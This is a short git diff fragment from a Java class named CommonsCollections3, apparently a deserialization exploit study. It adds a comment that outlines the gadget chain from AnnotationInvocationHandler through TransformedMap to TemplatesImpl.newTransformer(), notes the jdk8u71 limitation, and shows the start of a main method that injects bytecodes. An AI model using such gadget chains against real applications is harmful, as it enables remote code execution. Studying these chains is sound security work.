@@ -30,6 +30,13 @@ public class CommonsCollections3 {
         field.set(obj, value);
     }
 
+    /**
+     * AnnotationInvocationHandler#readObject()    !!!jdk8u71之后AnnotationInvocationHandler改动导致这里断了
+     *      TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value)
+     *      TransformedMap#checkSetValue(value)
+     *          transformerChain#transform() === TrAXFilter() --> templatesImpl.newTransformer()
+     */
+    // 3和1前面都是一样的，区别在于执行点变了
     public static void main(String[] args) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{
